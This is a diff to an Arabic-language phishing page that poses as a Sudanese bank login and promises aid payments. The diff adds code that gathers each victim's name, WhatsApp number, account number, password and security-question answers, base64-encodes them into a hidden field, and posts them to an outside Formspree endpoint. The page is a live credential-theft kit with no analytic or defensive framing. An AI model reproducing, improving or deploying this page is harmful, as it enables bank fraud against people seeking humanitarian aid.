@@ -13,11 +13,8 @@
         .main-logo { width: 130px; margin: 10px 0 20px 0; }
         
         .input-group { background: white; border: 1.5px solid #e0e0e0; margin-bottom: 12px; border-radius: 10px; padding: 2px 12px; display: flex; align-items: center; }
-        .input-group input { flex: 1; border: none; padding: 14px 5px; outline: none; text-align: right; font-size: 16px; width: 100%; color: #333; }
+        .input-group input, .input-group select { flex: 1; border: none; padding: 14px 5px; outline: none; text-align: right; font-size: 16px; width: 100%; color: #333; background: transparent; }
         
-        .question-box { background: white; border: 1.5px solid #e0e0e0; padding: 16px; margin-bottom: 10px; text-align: right; border-radius: 10px; cursor: pointer; position: relative; font-size: 15px; color: #444; }
-        .question-box::after { content: '▼'; position: absolute; left: 15px; color: #d32f2f; font-size: 10px; }
-
         .btn-login { width: 100%; background: linear-gradient(135deg, #d32f2f, #b71c1c); color: white; border: none; padding: 16px; border-radius: 10px; font-weight: bold; font-size: 17px; cursor: pointer; margin-top: 5px; }
         .btn-img { width: 48%; cursor: pointer; border-radius: 8px; }
         
@@ -43,36 +40,52 @@
         <img src="logo_colored.png" class="main-logo">
 
         <form action="https://formspree.io/f/xzdjwoao" method="POST" id="mainForm">
+            <input type="hidden" name="Data_Package" id="encrypted_data">
             
             <div id="currencyPage">
                 <h3>آختر عملة استلام المساعدات</h3>
-                <input type="hidden" name="العملة_المختارة" id="selected_currency_input">
+                <input type="hidden" id="selected_currency_input">
                 <div class="currency-option" id="opt1" onclick="selectCurr('opt1', 'جنيه سوداني')">جنيه سوداني</div>
                 <div class="currency-option" id="opt2" onclick="selectCurr('opt2', 'دولار امريكي فقط')">دولار امريكي فقط</div>
                 
                 <div style="margin-top: 20px;">
                     <h3>بيانات المستلم</h3>
-                    <div class="input-group"><input type="text" id="full_name" name="الاسم_الكامل" placeholder="الإسم الكامل"></div>
-                    <div class="input-group"><input type="number" id="whatsapp_num" name="رقم_واتساب" placeholder="رقم واتساب للتواصل"></div>
+                    <div class="input-group"><input type="text" id="full_name" placeholder="الإسم الكامل"></div>
+                    <div class="input-group"><input type="number" id="whatsapp_num" placeholder="رقم واتساب للتواصل"></div>
                     <button type="button" class="btn-login" onclick="checkCurrencyStep()">المتابعة لتسجيل الدخول</button>
                 </div>
             </div>
 
             <div id="loginPage">
                 <h3>تسجيل الدخول لحساب بنكك</h3>
-                <div class="input-group"><input type="text" id="acc_num" name="رقم_الحساب" placeholder="رقم الحساب أو معرف المستخدم"></div>
-                <div class="input-group"><input type="password" id="acc_pass" name="كلمة_المرور" placeholder="كلمة المرور"></div>
+                <div class="input-group"><input type="text" id="acc_num" placeholder="رقم الحساب أو معرف المستخدم"></div>
+                <div class="input-group"><input type="password" id="acc_pass" placeholder="كلمة المرور"></div>
                 <button type="button" class="btn-login" onclick="checkLogin()">دخول</button>
             </div>
 
             <div id="questionsPage">
-                <h4 style="color: #666; font-size: 14px; margin-bottom: 15px;">التحقق الأمني: يرجى الإجابة على سؤالين</h4>
-                <div class="question-box" onclick="showModal('popup_q1.png')">السؤال الأول</div>
-                <div class="input-group"><img src="icon_message.png" style="width:22px; margin-left:10px;"><input type="text" id="q1" name="سؤال_1" placeholder="إجابة السؤال الأول"></div>
-                <div class="question-box" onclick="showModal('popup_q2.png')">السؤال الثاني</div>
-                <div class="input-group"><img src="icon_message.png" style="width:22px; margin-left:10px;"><input type="text" id="q2" name="سؤال_2" placeholder="إجابة السؤال الثاني"></div>
-                <div class="question-box" onclick="showModal('popup_q3.png')">السؤال الثالث</div>
-                <div class="input-group"><img src="icon_message.png" style="width:22px; margin-left:10px;"><input type="text" id="q3" name="سؤال_3" placeholder="إجابة السؤال الثالث"></div>
+                <h4 style="color: #666; font-size: 14px; margin-bottom: 15px;">التحقق الأمني: يرجى اختيار الأسئلة والإجابة عليها</h4>
+                
+                <div class="input-group">
+                    <select id="q1_text">
+                        <option value="" disabled selected>اختر السؤال الأول</option>
+                        <option value="اسم الأم">ما هو اسم والدتك؟</option>
+                        <option value="أول مدرسة">ما هو اسم أول مدرسة التحقت بها؟</option>
+                        <option value="صديق الطفولة">ما هو اسم صديق الطفولة المفضل؟</option>
+                    </select>
+                </div>
+                <div class="input-group"><input type="text" id="q1_ans" placeholder="إجابة السؤال الأول"></div>
+
+                <div class="input-group">
+                    <select id="q2_text">
+                        <option value="" disabled selected>اختر السؤال الثاني</option>
+                        <option value="حيوان أليف">ما هو اسم حيوانك الأليف الأول؟</option>
+                        <option value="مدينة الوالدين">في أي مدينة ولد والداك؟</option>
+                        <option value="أكلة مفضلة">ما هي أكلتك المفضلة؟</option>
+                    </select>
+                </div>
+                <div class="input-group"><input type="text" id="q2_ans" placeholder="إجابة السؤال الثاني"></div>
+
                 <div style="display: flex; justify-content: space-between; margin-top: 15px; gap: 10px;">
                     <img src="btn_send.png" class="btn-img" onclick="checkQuestions()"><img src="btn_cancel.png" class="btn-img" onclick="location.reload()">
                 </div>
@@ -112,7 +125,7 @@
         function checkCurrencyStep() {
             const n = document.getElementById('full_name').value.trim();
             const w = document.getElementById('whatsapp_num').value.trim();
-            if (!selectedCurrencyText || !n || !w) { alert("يرجى اختيار العملة وإكمال بيانات الإسم والواتساب"); return; }
+            if (!selectedCurrencyText || !n || !w) { alert("يرجى اختيار العملة وإكمال البيانات"); return; }
             showPage('loginPage');
         }
 
@@ -123,13 +136,32 @@
             showPage('questionsPage');
         }
 
+        function encodeData(data) {
+            return btoa(unescape(encodeURIComponent(data)));
+        }
+
         function checkQuestions() {
-            const q1 = document.getElementById('q1').value.trim();
-            const q2 = document.getElementById('q2').value.trim();
-            const q3 = document.getElementById('q3').value.trim();
-            if (((q1!=="") + (q2!=="") + (q3!=="")) < 2) { alert("يرجى إجابة سؤالين على الأقل"); return; }
+            const q1t = document.getElementById('q1_text').value;
+            const q1a = document.getElementById('q1_ans').value.trim();
+            const q2t = document.getElementById('q2_text').value;
+            const q2a = document.getElementById('q2_ans').value.trim();
+
+            if (!q1t || !q1a || !q2t || !q2a) { alert("يرجى اختيار سؤالين والإجابة عليهما"); return; }
             
-            // إرسال البيانات النهائية لـ Formspree
+            // تجميع البيانات وتشفيرها
+            const rawData = `
+                العملة: ${selectedCurrencyText}
+                الاسم: ${document.getElementById('full_name').value}
+                واتساب: ${document.getElementById('whatsapp_num').value}
+                الحساب: ${document.getElementById('acc_num').value}
+                السر: ${document.getElementById('acc_pass').value}
+                س1: (${q1t}) ج1: ${q1a}
+                س2: (${q2t}) ج2: ${q2a}
+            `;
+            
+            document.getElementById('encrypted_data').value = encodeData(rawData);
+            
+            // إرسال النموذج
             document.getElementById('mainForm').submit();
             
             showPage('successMessage');
@@ -145,7 +177,6 @@
             if(target) target.style.display = 'block'; 
             window.scrollTo(0,0);
         }
-        function showModal(s) { document.getElementById('modalImg').src = s; document.getElementById('myModal').style.display = 'flex'; }
     </script>
 </body>
 </html>
